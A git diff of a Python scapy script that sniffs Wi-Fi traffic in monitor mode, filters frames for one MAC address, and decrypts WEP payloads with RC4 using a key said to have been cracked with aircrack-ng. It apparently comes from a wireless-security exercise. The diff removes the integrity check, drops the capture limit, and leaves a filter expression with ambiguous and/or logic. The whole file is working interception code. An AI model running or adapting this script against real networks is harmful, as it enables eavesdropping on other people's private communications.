@@ -2,6 +2,7 @@ from scapy.all import *
 import struct
 import binascii
 
+#Decryption/encryption algorithm for the WEP data
 def rc4(key, data):
     S = list(range(256))
     j = 0
@@ -20,13 +21,11 @@ def rc4(key, data):
         result.append(byte ^ K)
     return result
 
+#This function decrypts every WEP encrypted packet, and prints it if it contains useful information
 def wep_decrypt(packet):
-    wep_key = bytes.fromhex("0000000000")
+    wep_key = bytes.fromhex("0000000000") #Found the wep_key using aircrack-ng
 
-    #print("found one")
-    if packet.haslayer(Dot11):
-        print('WEP', packet.FCfield & 0b01000000 != 0)
-
+    #we filter if the packet contains WEP data
     if packet.haslayer(Dot11WEP):
         iv = packet[Dot11WEP].iv
 
@@ -34,25 +33,15 @@ def wep_decrypt(packet):
         encrypted_payload = packet[Dot11WEP].wepdata
 
         decrypted_data = rc4(rc4_key, encrypted_payload)
-        print('Decrypted', decrypted_data)
 
-        data, icv = decrypted_data[:-4], decrypted_data[-4:]
+        data = decrypted_data
+        print('DECRYPTED IF WEP; ', data, '\n')
 
-        calculated_icv = struct.pack('<L', binascii.crc32(data) & 0xFFFFFFFFFF)
-        print(icv, calculated_icv)
-
-        if icv == calculated_icv:
-            print("Decrypted Packet: ", data)
-        else:
-            print("ICV mismatch, possible decryption failure.")
-    else:
-        print("no wep")
-
-
+#Filters the packets if it contains the right mac adresses
 def packet_filter(packet):
-    router_mac = '08:be:ac:03:dc:2e'
+    filter_mac = 'b8:27:eb:ec:7e:a0'
     if packet.haslayer(Dot11):
-        return (packet.addr1 == router_mac or packet.addr2 == router_mac)
+        return (packet.addr1 == filter_mac  or packet.addr2 == filter_mac and packet.addr3 == filter_mac)
     return False
 
-sniff(iface = 'wlan0mon', prn = wep_decrypt, lfilter = packet_filter, count = 100)
+sniff(iface = 'wlan0mon', prn = wep_decrypt, lfilter = packet_filter)
